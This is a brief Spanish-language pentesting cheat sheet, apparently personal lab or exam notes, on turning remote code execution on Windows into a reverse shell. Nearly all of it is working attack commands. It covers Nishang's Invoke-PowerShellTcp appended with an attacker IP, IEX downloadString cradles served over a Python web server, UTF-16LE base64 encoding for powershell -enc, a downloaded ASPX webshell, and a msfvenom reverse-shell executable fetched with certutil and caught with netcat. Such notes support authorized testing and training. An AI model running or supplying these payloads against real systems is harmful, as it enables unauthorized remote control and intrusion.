
# WINDOWS
> RCE -> REV SHELL WINDOWS
```shell
#INSTALAR NISHANG
❯ wget https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Shells/Invoke-PowerShellTcp.ps1
❯ mv Invoke-PowerShellTcp.ps1 reverse.ps1
	Invoke-PowerShellTcp -Reverse -IPAddress 192.168.45.189 -Port 445 #AÑADIR A LA ÚLTIMA LINEA

#EJECUCIÓN
❯ python3 -m http.server 8000
IEX(New-Object Net.WebClient).downloadString('http://192.168.45.189:8000/reverse.ps1')
```



 
 >RCE -> REV SHELL WINDOWS EN ONE LINE
```shell
wget https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Shells/Invoke-PowerShellTcpOneLine.ps1
mv Invoke-PowerShellTcpOneLine.ps1 reverse.ps1
#EDITARLO Y QUEDARSE SOLO CON LA LINEA DE CLIENT
cat reverse.ps1 | iconv -t utf-16le | base64 -w 0; echo

#EN COMANDO A INJECTAR SE TENDRIA QUE VER ALGO ASÍ
powershell -enc ......................
```




>REVERSE SHELL WINDOWS SENSIVITY CHARACTERS
```r
CONVERT TO ICONV
❯ echo 'IEX(New-Object Net.WebClient).downloadString("http://192.168.45.173/reverse.ps1")' | iconv -t utf-16le

ICONV -> BASE64
❯ echo 'IEX(New-Object Net.WebClient).downloadString("http://192.168.45.173/reverse.ps1")' | iconv -t utf-16le | base64 -w 0;echo
```




>INJECTAR EN UNA WEBSHELL
```shell
❯ wget https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Shells/Invoke-PowerShellTcp.ps1
❯ mv Invoke-PowerShellTcp.ps1 PS.ps1
❯ nano PS.ps1
	#AGREGAMOS ESTO AL FINAL DEL ARCHIVO
	Invoke-PowerShellTcp -Reverse -IPAddress 192.168.45.223 -Port 443
❯ sudo rlwrap -cAr nc -nlvp 443
❯ sudo python3 -m http.server 80

#EN CASO DE QUE TENGAMOS UNA WEB SHELL ABIERTA.
powershell IEX(New-Object Net.WebClient).downloadString('http://192.168.45.192/PS.ps1')
```



>WEBSHELL
```shell
wget https://raw.githubusercontent.com/tennc/webshell/refs/heads/master/fuzzdb-webshell/asp/cmd.aspx
```


> MSFVENOM
```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.189 LPORT=443 -f exe -o shell.exe
certutil.exe -f -urlcache -split http://192.168.45.189/shell.exe shell.exe
rlwrap nc -nlvp 443
.\shell.exe
```